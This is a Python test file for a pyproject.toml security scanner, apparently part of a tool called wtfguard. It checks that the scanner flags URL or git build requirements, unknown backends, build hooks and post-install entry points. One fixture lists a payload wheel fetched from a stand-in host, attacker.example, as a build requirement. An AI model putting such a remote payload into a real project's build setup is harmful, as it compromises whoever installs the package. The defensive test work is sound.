#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tests for the pyproject.toml AST/TOML scanner."""

from pathlib import Path

from wtfguard.heuristics import (
    is_known_build_backend,
    looks_like_url_or_path,
    scan_pyproject_toml,
)
from wtfguard.models import Severity


def test_clean_pyproject_no_findings() -> None:
    content = """\
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "demo"
version = "1.0.0"
"""
    findings = scan_pyproject_toml(Path("pyproject.toml"), content)
    assert findings == []


def test_url_in_requires_is_flagged_high() -> None:
    content = """\
[build-system]
requires = ["setuptools>=68", "https://attacker.example/payload.whl"]
build-backend = "setuptools.build_meta"
"""
    findings = scan_pyproject_toml(Path("pyproject.toml"), content)
    rule_ids = {f.rule_id for f in findings}
    assert "BUILD_REQ_URL" in rule_ids
    assert any(f.severity == Severity.HIGH for f in findings if f.rule_id == "BUILD_REQ_URL")


def test_git_in_requires_is_flagged() -> None:
    content = """\
[build-system]
requires = ["git+https://example/private.git"]
build-backend = "setuptools.build_meta"
"""
    findings = scan_pyproject_toml(Path("pyproject.toml"), content)
    assert any(f.rule_id == "BUILD_REQ_URL" for f in findings)


def test_unknown_build_backend_flagged_low() -> None:
    content = """\
[build-system]
requires = ["setuptools"]
build-backend = "evil.custom.backend"
"""
    findings = scan_pyproject_toml(Path("pyproject.toml"), content)
    assert any(f.rule_id == "UNKNOWN_BUILD_BACKEND" and f.severity == Severity.LOW for f in findings)


def test_known_backends_recognized() -> None:
    for backend in (
        "setuptools.build_meta",
        "flit_core.buildapi",
        "poetry.core.masonry.api",
        "hatchling.build",
        "pdm.backend",
    ):
        assert is_known_build_backend(backend), f"{backend} should be recognized"


def test_looks_like_url_or_path_detection() -> None:
    assert looks_like_url_or_path("http://example/x") is True
    assert looks_like_url_or_path("https://example/x") is True
    assert looks_like_url_or_path("git+https://example/x") is True
    assert looks_like_url_or_path("/absolute/path") is True
    assert looks_like_url_or_path("file:///x") is True
    assert looks_like_url_or_path("requests>=2.0") is False
    assert looks_like_url_or_path("setuptools") is False


def test_build_hook_section_detected() -> None:
    content = """\
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[tool.hatch.hooks]
custom = "do_something"
"""
    findings = scan_pyproject_toml(Path("pyproject.toml"), content)
    assert any(f.rule_id == "BUILD_HOOK" and f.severity == Severity.MEDIUM for f in findings)


def test_poetry_post_install_script_flagged() -> None:
    content = """\
[build-system]
requires = ["poetry-core"]
build-backend = "poetry.core.masonry.api"

[tool.poetry.scripts]
post_install_hook = "demo.module:run"
"""
    findings = scan_pyproject_toml(Path("pyproject.toml"), content)
    assert any(f.rule_id == "POETRY_POSTINSTALL" for f in findings)


def test_entry_point_install_group_flagged() -> None:
    content = """\
[build-system]
requires = ["setuptools"]
build-backend = "setuptools.build_meta"

[project]
name = "demo"
version = "1.0"

[project.entry-points."post_install"]
hook = "demo:run"
"""
    findings = scan_pyproject_toml(Path("pyproject.toml"), content)
    assert any(f.rule_id == "ENTRY_POINT_INSTALL" for f in findings)


def test_malformed_toml_returns_empty() -> None:
    findings = scan_pyproject_toml(Path("pyproject.toml"), "this is not toml [[[")
    assert findings == []


def test_non_pyproject_file_returns_empty() -> None:
    findings = scan_pyproject_toml(Path("setup.cfg"), "[build-system]\n")
    assert findings == []
